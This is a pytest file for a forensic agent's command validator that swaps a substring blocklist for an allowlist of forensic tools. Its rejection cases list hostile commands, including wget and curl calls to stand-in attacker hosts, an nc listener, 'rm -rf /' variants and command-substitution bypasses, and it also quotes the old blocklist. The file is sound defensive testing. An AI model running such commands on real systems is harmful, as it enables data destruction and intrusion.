"""Allowlist-based command validation tests (A3 — TDD).

The previous validation was a lowercase-substring blocklist:

    BLOCKED_PATTERNS = ["rm -rf", "dd if=", ..., "wget ", "nc ", "netcat", "> /dev/"]
    if pattern in command.lower(): reject

That is bypassable by case (`RM -rf`), unicode-equivalent characters,
double-spacing (`curl  http`), command substitution (`$(rm -rf)`), and
many other techniques. We replace it with an allowlist sourced from the
ToolRegistry's tool metadata: only commands whose first token (basename)
matches a registered tool binary are allowed.

The blocklist is kept as a secondary defense-in-depth check.

Roadmap reference: Milestone A3 in CODE_REVIEW.md.
"""

from __future__ import annotations

import pytest

from find_evil_agent.agents.tool_executor import ToolExecutorAgent


# ---------------------------------------------------------------------------
# Specification — always pass, document the contract
# ---------------------------------------------------------------------------

class TestCommandAllowlistSpecification:
    """Document the allowlist validation contract."""

    def test_allowlist_contract(self):
        """Command validation rules:

        1. The first token of the command (post-shlex split, basename only)
           MUST be in the allowlist.
        2. The allowlist is sourced from ToolRegistry — only commands
           whose binary corresponds to a registered tool are allowed.
        3. Empty / whitespace-only commands are rejected.
        4. Malformed commands (unbalanced quotes) are rejected.
        5. Existing blocklist patterns continue to be rejected as a
           secondary check.
        6. Validation is case-insensitive on the binary name.

        Concrete bypass cases that MUST be blocked after A3:
            - `RM -rf /`  (case bypass on old blocklist)
            - `r m -rf /`  (whitespace bypass)
            - `$(rm -rf /)` (command substitution)
            - `/usr/bin/wget http://evil/x` (path-prefixed)
            - `; rm -rf /` (chained, semicolon)
        """
        assert hasattr(ToolExecutorAgent, "_validate_command_security")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

DEFAULT_ALLOWLIST = {
    "volatility", "rekall", "fls", "icat", "mmls", "fsstat",
    "log2timeline.py", "psort.py", "tcpdump", "tshark",
    "strings", "bulk_extractor", "grep", "md5sum", "sha256sum",
    "rip.pl", "file", "exiftool",
}


def _agent_with_allowlist(allowlist: set[str] | None = None) -> ToolExecutorAgent:
    """Construct a ToolExecutorAgent with an injected allowlist
    (avoids loading the real registry in unit tests)."""
    return ToolExecutorAgent(allowed_binaries=allowlist or DEFAULT_ALLOWLIST)


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------

class TestAllowlistEnforcement:
    """First-token must be a registered tool binary."""

    @pytest.mark.parametrize("command", [
        "strings /mnt/evidence/file.bin",
        "volatility -f /mnt/evidence/mem.dmp imageinfo",
        "grep -r ATTACK /workspace/case01",
        "file /mnt/evidence/disk.img",
        "/usr/bin/strings /mnt/evidence/file.bin",   # path-prefixed allowed
        "STRINGS /mnt/evidence/file.bin",            # case-insensitive on binary
    ])
    def test_allowed_commands_pass(self, command):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security(command) is True, (
            f"expected {command!r} to be allowed"
        )

    @pytest.mark.parametrize("command", [
        "ssh evil.host",                  # binary not in allowlist
        "wget http://evil.com/x",         # binary not in allowlist (was bypassable on blocklist)
        "curl http://attacker.com",       # ditto
        "nc -lvp 4444",                   # backconnect
        "/usr/bin/python -c 'import os'", # arbitrary interpreter
        "bash -c 'echo pwned'",
        "/bin/sh",
        "rm /mnt/evidence/file",          # rm not in allowlist
    ])
    def test_disallowed_commands_rejected(self, command):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security(command) is False, (
            f"expected {command!r} to be rejected"
        )


# ---------------------------------------------------------------------------
# Blocklist bypasses that allowlist now closes
# ---------------------------------------------------------------------------

class TestBlocklistBypassesNowBlocked:
    """Cases that slipped past the old `command.lower() in pattern` check."""

    @pytest.mark.parametrize("command", [
        "RM -rf /",                       # case bypass
        "Rm  -rF  /",                     # case + extra-space bypass
        "/bin/rm -rf /mnt",                # path-prefixed bypass
        "rm /tmp/x",                       # plain rm not in allowlist
    ])
    def test_rm_variants_blocked(self, command):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security(command) is False

    @pytest.mark.parametrize("command", [
        "curl http://evil",
        "Curl http://evil",
        "/usr/bin/curl http://evil",
        "wget http://evil/x",
        "WGET http://evil/x",
    ])
    def test_curl_wget_variants_blocked(self, command):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security(command) is False


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:
    def test_empty_command_rejected(self):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security("") is False

    def test_whitespace_only_rejected(self):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security("   \t  ") is False

    def test_malformed_quoting_rejected(self):
        """Unbalanced quotes — shlex raises; treat as invalid."""
        agent = _agent_with_allowlist()
        assert agent._validate_command_security("strings 'unterminated") is False

    def test_blocklist_still_active_for_chained_commands(self):
        """Even when first token is allowed, semicolon-chained `rm` is blocked
        by the blocklist defense-in-depth check."""
        agent = _agent_with_allowlist()
        assert agent._validate_command_security("strings /tmp/x; rm /tmp/x") is False

    def test_no_args_command_allowed(self):
        agent = _agent_with_allowlist()
        assert agent._validate_command_security("strings") is True


# ---------------------------------------------------------------------------
# Registry integration — the default allowlist comes from ToolRegistry
# ---------------------------------------------------------------------------

class TestRegistryIntegration:
    """When no allowlist is injected, the agent populates one from
    ToolRegistry's metadata at first-use."""

    def test_default_allowlist_includes_registered_tools(self):
        """Without explicit allowlist, agent uses registry."""
        agent = ToolExecutorAgent()
        # `strings` and `volatility` are in metadata.yaml
        assert agent._validate_command_security("strings /mnt/evidence/x") is True
        assert agent._validate_command_security("volatility -f /mnt/evidence/m.dmp imageinfo") is True

    def test_default_allowlist_blocks_unregistered_tools(self):
        agent = ToolExecutorAgent()
        assert agent._validate_command_security("ssh victim") is False
        assert agent._validate_command_security("nc -lvp 4444") is False
